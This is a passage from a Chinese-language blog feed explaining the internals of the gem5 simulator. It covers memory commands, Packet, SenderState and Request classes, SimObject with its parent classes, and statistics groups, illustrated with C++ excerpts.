HasData</td><td></td><td></td></tr><tr><td>MemFenceReq</td><td></td><td></td><td></td></tr><tr><td>MemSyncReq</td><td></td><td></td><td></td></tr><tr><td>MemSyncResp</td><td></td><td></td><td></td></tr><tr><td>MemFenceResp</td><td></td><td></td><td></td></tr><tr><td>CleanSharedReq</td><td></td><td></td><td></td></tr><tr><td>CleanSharedResp</td><td></td><td></td><td></td></tr><tr><td>CleanInvalidReq</td><td></td><td></td><td></td></tr><tr><td>CleanInvalidResp</td><td></td><td></td><td></td></tr></tbody></table><p>gem5 中为方便两者相连，使用了很有技巧的编程手段。定义 MemCmd::CommandInfo 结构体如下，位域中通过位图表示的多个属性，在初始化时命令和属性就会被捆绑起来，保存在静态变量数组 <code>commandInfo[]</code> 中。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">CommandInfo</span> &#123;<br>  <span class="hljs-comment">/// Set of attribute flags.</span><br>  <span class="hljs-type">const</span> std::bitset&lt;NUM_COMMAND_ATTRIBUTES&gt; attributes;<br>  <span class="hljs-comment">/// Corresponding response for requests; InvalidCmd if no</span><br>  <span class="hljs-comment">/// response is applicable.</span><br>  <span class="hljs-type">const</span> Command response;<br>  <span class="hljs-comment">/// String representation (for printing)</span><br>  <span class="hljs-type">const</span> std::string str;<br><br>  <span class="hljs-built_in">CommandInfo</span>(std::initializer_list&lt;Attribute&gt; attrs,<br>        Command _response, <span class="hljs-type">const</span> std::string &amp;_str) :<br>    <span class="hljs-built_in">attributes</span>(<span class="hljs-built_in">buildAttributes</span>(attrs)), <span class="hljs-built_in">response</span>(_response), <span class="hljs-built_in">str</span>(_str)<br>    &#123;&#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>使用 <code>testCmdAttrib</code> 函数和静态类数组 <code>commandInfo</code>（包含了所有命令），就可以简洁地实现测试标志位的函数，如 <code>isRead()</code>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">static</span> <span class="hljs-type">const</span> CommandInfo commandInfo[];<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">testCmdAttrib</span><span class="hljs-params">(MemCmd::Attribute attrib)</span> <span class="hljs-type">const</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> commandInfo[cmd].attributes[attrib] != <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isRead</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-built_in">testCmdAttrib</span>(IsRead); &#125;<br></code></pre></td></tr></table></figure><p><code>SenderState</code> 类描述 Packet 的发送者状态。对于看到该 <code>Packet</code> 的 <code>SimObject</code> 对象而言，<code>SenderState</code> 类可以用于保存与 Packet 相关的状态（例如，MSHR）。</p><blockquote><p>MSHR(Miss Status and handling Register) 保存并处理缓存丢失所需的所有信息，包括要请求的目标列表。</p></blockquote><p>指向 <code>SenderState</code> 类的指针会在应答 <code>Packet</code> 的函数中被返回，如此一来，SimObject 对象可以迅速查看 <code>Packet</code> 中的状态位，并进行相应的处理（见 <code>findNextSenderState()</code> 函数）。 <code>SenderState</code> 类以链表的形式相串起来：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">SenderState</span> &#123;<br>  SenderState* predecessor;<br>  <span class="hljs-built_in">SenderState</span>() : <span class="hljs-built_in">predecessor</span>(<span class="hljs-literal">NULL</span>) &#123;&#125;<br>  <span class="hljs-keyword">virtual</span> ~<span class="hljs-built_in">SenderState</span>() &#123;&#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>在响应该 Packet 时，会返回一个 SenderState* 类型的指针，以便 SimObject 对象可以快速查找处理它所需的状态。要遍历发送者组成的链表，返回第一个符合类型T的实例，需使用 <code>findNextSenderState()</code> 函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/**</span><br><span class="hljs-comment">  * 遍历发送者组成的链表，返回第一个符合类型T的实例</span><br><span class="hljs-comment">  * @return The topmost state of type T</span><br><span class="hljs-comment">  */</span><br><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-function">T * <span class="hljs-title">findNextSenderState</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123;<br>    T *t = <span class="hljs-literal">NULL</span>;<br>    SenderState* sender_state = senderState;<br>    <span class="hljs-keyword">while</span> (t == <span class="hljs-literal">NULL</span> &amp;&amp; sender_state != <span class="hljs-literal">NULL</span>) &#123;<br>        t = <span class="hljs-built_in">dynamic_cast</span>&lt;T*&gt;(sender_state);<br>        sender_state = sender_state-&gt;predecessor;<br>    &#125;<br>    <span class="hljs-keyword">return</span> t;<br>&#125;<br></code></pre></td></tr></table></figure><p>有时，为处理特殊发送设备的状态，程序员也可以从该类中派生出相对应的子类。由于多个 <code>SimObject</code> 对象都可以从自己的视角出发来添加新的 <code>SenderState</code>，只要在响应返回时，能恢复之前的 <code>SenderState</code> 对象即可。因此，在修改 <code>Packet</code> 类中的 <code>SenderState</code> 字段之前，应该始终维护 <code>SenderState</code> 链表。</p><h3 id="Packet-功能">Packet 功能</h3><p>通常来说，<code>Packet</code> 类中包含了以下内容，可被函数使用：</p><ul><li>地址。 通过 <code>getAddr()</code> 函数获得。该地址将用于将 Packet 路由到其目的地（若未明确设置目的地）并在目标处处理 Packet 的地址。通常，它是发起请求对象的物理地址，某些情况下也可能是虚拟地址：在执行地址转换之前访问虚拟 Cache。但有时也可能是需要获取的数据地址：例如，在 Cache 未命中时，Packet 地址可能是要获取的块的地址，而非请求地址。</li><li>请求或包的大小。 通过 <code>getSize()</code> 获得。请求所占的空间大小</li><li>指向 Packet 中数据的指针。在不同层次结构中，数据可能是不同的，因此在设计上它位于 Packet 对象，而不是 request。<ul><li>用 <code>dataStatic()</code> <code>dataDynamic()</code> 函数设置的数据，在 Packet 对象被 free 时，其内的数据分别应：不被 free、不使用 delete [] 进行 free。</li><li>用 <code>allocate()</code> 函数分配空间时，数据会在 Packet 被释放时 free</li><li>通过 <code>getPtr()</code> 获得指针</li><li>使用 <code>get()</code> 函数获取，<code>set()</code> 函数设置</li></ul></li><li>状态 包括以下几种：Success, BadAddress, Not Acknowleged, and Unknown.</li><li>List of command attributes 需要对 Packet 施加的命令和属性，由 MemCmd 维护。注意：状态字段和命令属性中的数据有一些重叠。这在很大程度上是为了使包在打包时可以很容易地重新初始化，或者在原子访问或函数访问时很容易重用。</li><li>Pointer to SenderState 携带特定的发送设备的状态。在包的响应中返回一个指向该状态的指针，以便发送方可以快速查找处理它所需的状态。</li><li>Pointer to CoherenceState 用于保存 Coherence 一致性相关的状态。</li><li>Pointer to request 指向请求的指针</li></ul><h2 id="Request">Request</h2><p><code>Request</code> 对象封装了 CPU 或 I/O 设备发出的原始请求。<code>Request</code> 的参数在整个事务中是持久的。因此对于一给定的 <code>Request</code>，其字段最多只需写入一次。但也有一些构造函数和 update 方法允许在不同时间（或根本不）写入对象的某些字段。用户可通过 <code>accessor()</code> 函数获取 Request 字段的读取权限，同时也可验证正在读取的字段中的数据是否有效。注意，Request 中的字段通常不适用于真实系统中的设备，通常用于统计或调试，不能作为真实的系统架构。</p><p><code>Request</code> 对象的字段包括了：</p><ul><li>Virtual Address 虚拟地址。当该请求直接表示为物理地址时该字段无效（如 DMA I/O 设备发出的请求）</li><li>Physical Address 物理地址</li><li>Data Size 数据大小</li><li>Time the request was created 创建时间</li><li>The ID of the CPU/thread that caused this request. 创建该请求的 CPU 或线程 ID</li><li>The PC that caused this request 产生该请求的指令 PC 值。若不是由 CPU 发送的，那么该字段无效</li></ul><h3 id="Request-类">Request 类</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Request</span> &#123;<br>  <span class="hljs-keyword">private</span>:<br>    <span class="hljs-comment">// The physical address of the request. </span><br>    Addr _paddr = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// The virtual address of the request.</span><br>    Addr _vaddr = MaxAddr;<br><br>    <span class="hljs-comment">// The size of the request. Always valid as long as vir/phy address fields is valid.</span><br>    <span class="hljs-type">unsigned</span> _size = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/** Byte-enable mask for writes. */</span><br>    std::vector&lt;<span class="hljs-type">bool</span>&gt; _byteEnable;<br><br>    <span class="hljs-comment">// The requestor ID which is unique in the system for all ports</span><br>    <span class="hljs-comment">// that are capable of issuing a transaction</span><br>    RequestorID _requestorId = invldRequestorId;<br><br>    <span class="hljs-comment">/** Flag structure for the request. */</span><br>    Flags _flags;<br><br>    <span class="hljs-comment">/** Flags that control how downstream cache system maintains coherence*/</span><br>    CacheCoherenceFlags _cacheCoherenceFlags;<br><br>    <span class="hljs-comment">/** Private flags for field validity checking. */</span><br>    PrivateFlags privateFlags;<br><br>    <span class="hljs-comment">// The time this request was started. Used to calculate latencies. </span><br>    Tick _time = MaxTick;<br><br>    <span class="hljs-comment">// The task id associated with this request</span><br>    <span class="hljs-type">uint32_t</span> _taskId = context_switch_task_id::Unknown;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * The stream ID uniquely identifies a device behind the</span><br><span class="hljs-comment">     * SMMU/IOMMU Each transaction arriving at the SMMU/IOMMU is</span><br><span class="hljs-comment">     * associated with exactly one stream ID.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-type">uint32_t</span> _streamId = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * The substream ID identifies an &quot;execution context&quot; within a</span><br><span class="hljs-comment">     * device behind an SMMU/IOMMU. It&#x27;s intended to map 1-to-1 to</span><br><span class="hljs-comment">     * PCIe PASID (Process Address Space ID). The presence of a</span><br><span class="hljs-comment">     * substream ID is optional.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-type">uint32_t</span> _substreamId = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Extra data for the request, such as the return value of</span><br><span class="hljs-comment">     * store conditional or the compare value for a CAS. */</span><br>    <span class="hljs-type">uint64_t</span> _extraData = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/** The context ID (for statistics, locks, and wakeups). */</span><br>    ContextID _contextId = InvalidContextID;<br><br>    <span class="hljs-comment">/** program counter of initiating access; for tracing/debugging */</span><br>    Addr _pc = MaxAddr;<br><br>    <span class="hljs-comment">/** Sequence number of the instruction that creates the request */</span><br>    InstSeqNum _reqInstSeqNum = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/** A pointer to an atomic operation */</span><br>    AtomicOpFunctorPtr atomicOpFunctor = <span class="hljs-literal">nullptr</span>;<br><br>    LocalAccessor _localAccessor;<br><br>    <span class="hljs-comment">/** The instruction count at the time this request is created */</span><br>    Counter _instCount = <span class="hljs-number">0</span>;<br>&#125;;<br><br><br><span class="hljs-built_in">Request</span>(Addr vaddr, <span class="hljs-type">unsigned</span> size, Flags flags,<br>            RequestorID id, Addr pc, ContextID cid,<br>            AtomicOpFunctorPtr atomic_op=<span class="hljs-literal">nullptr</span>)<br>    &#123;<br>        <span class="hljs-built_in">setVirt</span>(vaddr, size, flags, id, pc, std::<span class="hljs-built_in">move</span>(atomic_op));<br>        <span class="hljs-built_in">setContext</span>(cid);<br>        _byteEnable = std::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">bool</span>&gt;(size, <span class="hljs-literal">true</span>);<br>    &#125;<br><br><br>    <span class="hljs-function"><span class="hljs-type">void</span></span><br><span class="hljs-function">    <span class="hljs-title">setVirt</span><span class="hljs-params">(Addr vaddr, <span class="hljs-type">unsigned</span> size, Flags flags, RequestorID id, Addr pc,</span></span><br><span class="hljs-params"><span class="hljs-function">            AtomicOpFunctorPtr amo_op=<span class="hljs-literal">nullptr</span>)</span></span><br><span class="hljs-function">    </span>&#123;<br>        _vaddr = vaddr;<br>        _size = size;<br>        _requestorId = id;<br>        _pc = pc;<br>        _time = <span class="hljs-built_in">curTick</span>();<br><br>        _flags.<span class="hljs-built_in">clear</span>(~STICKY_FLAGS);<br>        _flags.<span class="hljs-built_in">set</span>(flags);<br>        privateFlags.<span class="hljs-built_in">clear</span>(~STICKY_PRIVATE_FLAGS);<br>        privateFlags.<span class="hljs-built_in">set</span>(VALID_VADDR|VALID_SIZE|VALID_PC);<br>        depth = <span class="hljs-number">0</span>;<br>        accessDelta = <span class="hljs-number">0</span>;<br>        translateDelta = <span class="hljs-number">0</span>;<br>        atomicOpFunctor = std::<span class="hljs-built_in">move</span>(amo_op);<br>        _localAccessor = <span class="hljs-literal">nullptr</span>;<br>    &#125;<br><br>        <span class="hljs-function"><span class="hljs-type">void</span></span><br><span class="hljs-function">    <span class="hljs-title">setContext</span><span class="hljs-params">(ContextID context_id)</span></span><br><span class="hljs-function">    </span>&#123;<br>        _contextId = context_id;<br>        privateFlags.<span class="hljs-built_in">set</span>(VALID_CONTEXT_ID);<br>    &#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Cpp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Cpp</tag>
      
      <tag>gem5</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>深入理解 Gem5 之三</title>
    <link href="/2022/03/13/2022-3-13-gem5-3/"/>
    <url>/2022/03/13/2022-3-13-gem5-3/</url>
    
    <content type="html"><![CDATA[<h1>深入理解 Gem5 之三——SimObject</h1><p>之前的两篇博文分别介绍了 gem5 的<a href="https://dingfen.github.io/cpp/2022/02/24/gem5-1.html">事件触发机制</a>和<a href="https://dingfen.github.io/cpp/2022/03/08/gem5-2.html">序列化问题</a>，它们都和 SimObject 类有密切的联系。正所谓万事俱备，只欠东风。基于目前的理解，我可以更深入地看看 SimObject 类的实现方式。</p><h2 id="父类">父类</h2><p>SimObject 类是一个非常复杂但又十分重要的类，它在 Gem5 中占有极为重要的地位。gem5 的模块化设计是围绕 SimObject 类型构建的。 模拟系统中的大多数组件都是 SimObjects 的子类，如CPU、缓存、内存控制器、总线等。gem5 将所有这些对象从其 C++ 实现导出到 python。使用提供的 python 配置脚本便可以创建任何 SimObject 类对象，设置其参数，并指定 SimObject 之间的交互。理解该类的实现有助于我们理解整个 gem5 模拟器的运作逻辑。我们先从它的父类开始讲起，它一共有 5 个父类：EventManger、Serializable、Drainable、statistics::Group、Named。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SimObject</span> : <span class="hljs-keyword">public</span> EventManager, <span class="hljs-keyword">public</span> Serializable, <span class="hljs-keyword">public</span> Drainable,<br>    <span class="hljs-keyword">public</span> statistics::Group, <span class="hljs-keyword">public</span> Named<br></code></pre></td></tr></table></figure><p>其中仅有 statistics::Group 类我未作介绍，最后来理解一下 statistics::Group 的作用及实现。</p><h3 id="statistics-Group">statistics::Group</h3><p>statistics 是 gem5 项目中C++的一个命名空间，statistics::Group 类是统计数据的容器。Group 对象之间可组成一个<strong>树状的层次结构</strong>。数据统计子系统用 Groups 之间的关系来反推 SimObject 层次结构，并暴露对象内部的层次结构，从而可以更方便地将统计数据分组到它们自己的类中，然后合并到父类 Group（通常是一个 SimObject）中。</p><p>Group 类中，有一个指向父节点的指针，以及包含本级信息的数组 stats，和包含了子类 Group 数组的 statGroups 和 mergedStatGroups。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Group</span> &#123;<br>  <span class="hljs-comment">/** Parent pointer if merged into parent */</span><br>  Group *mergedParent;<br>  std::map&lt;std::string, Group *&gt; statGroups;<br>  std::vector&lt;Group *&gt; mergedStatGroups;<br>  std::vector&lt;Info *&gt; stats;<br>&#125;<br><br>Group::<span class="hljs-built_in">Group</span>(Group *parent, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *name)<br>    : <span class="hljs-built_in">mergedParent</span>(<span class="hljs-literal">nullptr</span>) &#123;<br>    <span class="hljs-keyword">if</span> (parent &amp;&amp; name) &#123;<br>        parent-&gt;<span class="hljs-built_in">addStatGroup</span>(name, <span class="hljs-keyword">this</span>);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (parent &amp;&amp; !name) &#123;<br>        parent-&gt;<span class="hljs-built_in">mergeStatGroup</span>(<span class="hljs-keyword">this</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>从构造函数可以看出，当子类 Group 未提供姓名时，使用 mergedStatGroups 存储信息。Group 类可以很轻松地构造出复杂的树状层次，例如：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// test code</span><br><span class="hljs-function">statistics::Group <span class="hljs-title">root</span><span class="hljs-params">(<span class="hljs-literal">nullptr</span>)</span></span>;<br><span class="hljs-function">statistics::Group <span class="hljs-title">node1</span><span class="hljs-params">(&amp;root, <span class="hljs-string">&quot;Node1&quot;</span>)</span></span>;<br><span class="hljs-function">statistics::Group <span class="hljs-title">node2</span><span class="hljs-params">(&amp;root, <span class="hljs-string">&quot;Node2&quot;</span>)</span></span>;<br><span class="hljs-function">statistics::Group <span class="hljs-title">node1_1</span><span class="hljs-params">(&amp;node1, <span class="hljs-string">&quot;Node1_1&quot;</span>)</span></span>;<br><span class="hljs-function">statistics::Group <span class="hljs-title">node2_1</span><span class="hljs-params">(&amp;node2, <span class="hljs-string">&quot;Node2_1&quot;</span>)</span></span>;<br><span class="hljs-function">statistics::Group <span class="hljs-title">node2_2</span><span class="hljs-params">(&amp;node2, <span class="hljs-string">&quot;Node2_2&quot;</span>)</span></span>;<br><br><span class="hljs-comment">/* we can get</span><br><span class="hljs-comment"> *        root</span><br><span class="hljs-comment"> *       /     \</span><br><span class="hljs-comment"> *  node1       node2</span><br><span class="hljs-comment"> *    |        /     \</span><br><span class="hljs-comment"> * node1_1  node2_1 node2_2</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><p>gem5 中用 Info 类维护统计数据以及对象的基本信息，由于和本篇博文主题关系不大，不再赘述。</p><h3 id="小结">小结</h3><p>在正式开始之前，再回顾一下五个父类各自的作用：</p><ul><li>EventManager 类：负责调度、管理、执行事件。EventManager 类是对 EventQueue 类的包装，SimObject 对象中所有的事件实际都由 EventQueue 队列管理。该队列以二维的单链表的形式管理着所有事件，事件以触发时间点从近到远排列。</li><li>Serializable 类：负责对象的序列化。SimObjects 可通过 <code>SimObject::serializeAll()</code> 函数自动完成序列化，写入到自己的 sections 中。Serializable 类根据 SimObject 类对象的名字以及对象间的包含关系，帮助用户构建起了层次化的序列化模型，并使用该模型完成 SimObject 的序列化，以 ini 文件格式输出。</li><li>Drainable 类：负责 drain 对象。DrainManager 类以单例的方式管理整个模拟器的 drain 过程。只有系统中所有的对象都被 drained，才能开始序列化、更改模型等操作。完成后需要使用 <code>DrainManager::resume()</code> 函数将系统回归到正常运行状态。</li><li>statistics::Group 类：负责运行过程中统计、管理数据。Group 对象之间可组成树状层次，从而反应出 SimObject 对象间的树状层次。</li><li>Name 类：负责给 SimObject 起名。</li></ul><h2 id="SimObject">SimObject</h2><p>对其父类有了充足的理解后，我们再来看一下 SimObject 类中的静态变量：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SimObject</span> : <span class="hljs-keyword">public</span> EventManager, <span class="hljs-keyword">public</span> Serializable, <span class="hljs-keyword">public</span> Drainable,<br>                  <span class="hljs-keyword">public</span> statistics::Group, <span class="hljs-keyword">public</span> Named &#123;<br>  <span class="hljs-keyword">private</span>:<br>    <span class="hljs-keyword">typedef</span> std::vector&lt;SimObject *&gt; SimObjectList;<br>    <span class="hljs-type">static</span> SimObjectList simObjectList;<br><br>    <span class="hljs-comment">/** Helper to resolve an object given its name. */</span><br>    <span class="hljs-type">static</span> SimObjectResolver *_objNameResolver;<br></code></pre></td></tr></table></figure><p>SimObject 类中维护了一个数组，记录所有被例化的对象，方便统一管理。SimObjectResolver 类根据传入的 SimObject 路径名字，解析出 SimObject 对象；维护 simObjectList 数组的目的是方便实现 <code>serializeAll()</code> 函数，也方便用户通过对象名找到对应的 SimObject。</p><p>再来看看 SimObject 类有哪些成员：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SimObject</span> : <span class="hljs-keyword">public</span> EventManager, <span class="hljs-keyword">public</span> Serializable, <span class="hljs-keyword">public</span> Drainable,<br>                  <span class="hljs-keyword">public</span> statistics::Group, <span class="hljs-keyword">public</span> Named &#123;<br>  <span class="hljs-keyword">private</span>:<br>    <span class="hljs-comment">/** Manager coordinates hooking up probe points with listeners. */</span><br>    ProbeManager *probeManager;<br>    <span class="hljs-comment">/** Cached copy of the object parameters. */</span><br>    <span class="hljs-type">const</span> SimObjectParams &amp;_params;<br>&#125;;<br></code></pre></td></tr></table></figure><p>ProbeManager 类是一个可连接探测点和监视器的协调类。所谓探测点主要用于 PMU(Performance Measurement Unit) 的实现，PMU 在 RTL 实现中，通常用于评估处理器模块的性能。而在 gem5 模拟器中，需要使用探测点（Probe Point）为 SimObject 类实现 PMU 提供了统一的接口，从而易于维护，simobject 对象调用 notify 时，需将事件计数增量作为它的唯一参数。</p><p>从 gem5 的官方文档中，可了解到 <a href="http://simulate.py">simulate.py</a> 使用以下函数完成对模拟对象的初始化：</p><ul><li><code>SimObject::init()</code> 只有当 C++ SimObject 对象被创建，且所有接口都被连上后，该函数会被调用</li><li><code>SimObject::regStats()</code> 本是 Group 类的回调函数，用于设置需要复杂参数的统计信息。<br>（例如，分布）<ul><li><code>SimObject::initState()</code> 若 SimObject 不是从检查点恢复时，需要调用该函数。该函数标记了状态的初始点，仅在冷启动时会被使用，让 simobject 回到初始状态。</li><li><code>SimObject::loadState()</code> 若从检查点恢复，调用该函数。其默认实现是调用 <code>unserialize()</code> 函数。因为从检查点恢复的过程就如同序列化后，装载之前保存的状态的过程。</li></ul></li><li><code>SimObject::resetStats()</code> 重置统计数据。</li><li><code>SimObject::startup()</code> 是模拟前的最终的启动函数。此时所有状态都已初始化（包括未序列化的状态，如果有的话，如 <code>curTick()</code> 的值），因此这是调度初始事件的合适时间点。</li><li>Drainable::drainResume() 如果从检查点恢复。</li></ul><p>以上这些函数（除 <code>loadState()</code> 有默认非空的实现）都需要继承 SimObject 类的派生类来实现。SimObject 类只是搭建了模拟对象的运行框架，规定了对象的运行步骤。</p><p>最后再介绍一些有意义的成员函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SimObject</span> &#123;<br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> Port &amp;<span class="hljs-title">getPort</span><span class="hljs-params">(<span class="hljs-type">const</span> std::string &amp;if_name, PortID idx=InvalidPortID)</span></span>;<br>    <span class="hljs-comment">/** Write back dirty buffers to memory using functional writes. */</span><br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">memWriteback</span><span class="hljs-params">()</span> </span>&#123;&#125;;<br>    <span class="hljs-comment">/** Invalidate the contents of memory buffers. */</span><br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">memInvalidate</span><span class="hljs-params">()</span> </span>&#123;&#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中，<code>getPort()</code> 用于获取给定名称和索引的端口。通常在绑定时使用，返回对协议无关端口的引用。</p><p>注意到，gem5 有一对请求和响应端口接口。 所有内存对象都通过端口连接在一起。这些端口在内存对象之间提供了三种不同的内存系统模式：时序(timing)、原子(atomic)和功能(functional)。 最重要的模式是时序模式，即 cycle-level 级别的时序周期模式。其他模式仅在特殊情况下使用，这些端口可以让 SimObject 相互通信。</p><p><code>memWriteback()</code> 函数将脏缓冲区写回内存。函数完成后，对象内所有脏数据都已写回内存。带缓存的系统通常用该函数来为检查点前做准备。<code>memInvalidate()</code> 函数使内存缓冲区的内容无效。当切换到硬件虚拟化 CPU 模型时，我们需要确保系统中没有任何在我们返回时陈旧的缓存数据。该函数将所有此类状态刷新回主存储器，但它不会将任何脏状态写回内存。</p><h2 id="时钟-与-ClockedObject">时钟 与 ClockedObject</h2><p>接下来，研究一个常见的 SimObject 派生类 ClockedObject，同时也了解一下 Gem5 中时钟的实现方式</p><h3 id="时钟">时钟</h3><p><code>curTick()</code> 全局函数，通常使用 <code>curTick()</code> 来获取全局时钟值。</p><figure class="highlight c++"><table><tr><td 